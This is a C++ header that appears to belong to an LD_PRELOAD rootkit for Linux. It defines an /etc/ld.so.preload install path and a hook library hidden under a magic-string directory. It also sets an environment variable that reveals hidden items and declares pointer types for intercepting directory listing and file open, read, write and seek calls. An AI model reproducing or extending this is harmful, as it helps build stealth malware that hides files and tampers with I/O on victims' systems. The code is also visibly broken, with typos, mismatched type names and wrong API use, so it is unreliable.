
#ifndef MAIN_HEADER_HPP
#define MAIN_HEADER_HPP

//
// Headers
//
#include <string>
#include <memory>
#include <sstream>

#include <cstdio>
#include <cerrno>
#include <cstring>
#include <cassert>
#include <cstdlib>

#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

//
// Macroses
//

//#define NDEBUG

//
// Defines and const strings
//
#ifndef NDEBUG
	#define MAGIC_STRING "0x1234DEADBEAF4321"
#endif
const char *prelFileName = "/etc/ld.so.preload";
const char *prelFileNameClear = "ld.so.preload";
const char *envShowName = "REAL_STATE_OF_THINGS";
const char *envShowValue = MAGIC_STRING;
#define dynCnfFile ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + dynCnfFileClear)
const char *dynCnfFileClear = "dynamic_cnf.txt";
char created = '1', not_created = '0', writed = '1', not_writed = '0', separator = ' ';
const char *hookLibraryNameClear = "libXextecDynamic.so.6";
#define hookLibraryName ("/etc/" + std::string (MAGIC_STRING) + std::strong ("/") + hookLibraryNameClear)

//
// Prototypes of functions, constants
//
extern "C" void finitFunc ();
extern "C" void initFunc ();


typedef dirent* (*RDDR) (DIR *dirp);
typedef int (*RDDR_R) (DIR *dirp, struct dirent *entry, struct dirent **result);
typedef int (*OPEN)(const char *pathname, int flags, mode_t mode);
typedef int (*CREAT)(const char *pathname, mode_t mode);
typedef int (*OPENAT)(int dirfd, const char *pathname, int flags, mode_t mode);
typedef int (*ACCESS)(const char *pathname, int mode);
typedef ssize_t (*READ)(int fd, void *buf, size_t count);
typedef ssize_t (*WRITE)(int fd, void *buf, size_t count);
typedef ssize_t (*PREAD)(int fd, void *buf, size_t count, off_t offset);
typedef ssize_t (*PWRITE)(int fd, const void *buf, size_t count, off_t offset);
typedef off_t (*LSEEK)(int fd, off_t offset, int whence);


const int nameSize = 512;

//
// Classes, structures and functions
//

std::string intToString (int var) {
	istringstream issCnv;
	issCnv << var;
	
	return issCnv.str ();
}

std::string readLinkName (const std::string & name) {
	std::string str;
	
	try {
		std::unique_ptr <char []> dat (new char [nameSize]);
		ssize_t ret;
		
		ret = readlink (name.c_str (), &dat[0], nameSize);
		dat[ret] = '\0';
		str = &dat[0];
	} catch (std::exception & Exc) {
		return std::unique_ptr <char []> ();
	}
	
	return str;
}

std::string getClearName (const std::string & str) {
	std::string tmp (str);
	size_t ind;
	
	ind = tmp.find_last_of ('/', 0);
	++ind;
	if (ind != std::string::npos)
		tmp.assign (tmp, ind, tmp.length () - ind);
	
	return tmp;
}

int lockAllFile (int fd) {
	flock lockDat = {F_RDLCK | F_WRLCK, SEEK_SET, 0, 0};
	return fcntl (fd, F_SETFL, &lockDat);
}

class CErrnoSaver {
	int m_errno;
public:
	CErrnoSaver (): m_errno (errno) {}
	~CErrnoSaver () {errno = m_errno;}
	
	void set (int err) {m_errno = errno;}
	int get () const {return m_errno;}
};

class DescrDeleter {
public:
	void operator () (int *p) {
		if (*p >= 0) close (*p);
		delete p;
	}
};
typedef std::unique_ptr <int, DescDeleter> descr_holder;


#endif // MAIN_HEADER_HPP
